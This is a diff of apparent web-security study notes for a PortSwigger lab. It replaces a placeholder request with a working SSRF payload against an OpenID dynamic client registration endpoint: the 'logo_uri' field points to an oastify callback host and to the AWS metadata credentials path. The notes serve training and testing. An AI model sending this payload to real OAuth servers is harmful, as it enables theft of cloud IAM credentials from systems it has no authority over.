@@ -509,19 +509,21 @@ Host: COLLABORATOR.DOMAIN
 
 >POST request to register data to the clien application with redirect URL endpoint in JSON body. Provide a redirect_uris array containing an arbitrary whitelist of callback URIs.  
 
-[PortSwigger Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)  
-
 ```json
 POST /reg HTTP/1.1
-Host: TARGET.web-security-academy.net
+Host: oauth-0a8b00df03e10b2ec300149f023b0096.web-security-academy.net
 Content-Type: application/json
+Content-Length: 206
 
 {
-    "redirect_uris" : [
-        "http://localhost:6566"
-    ]
-}
+"redirect_uris":["https://example.com"],
+    "logo_uri" : "https://ct9vlhusb0to24fcrs5t3qsmpdv4jv7k.oastify.com","logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
+}  
 ```  
+
+![ssrf_redirect_uris.png](ssrf_redirect_uris.png)  
+
+[PortSwigger Lab: SSRF via OpenID dynamic client registration](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)  
 
 ### XXE + SSRF
 
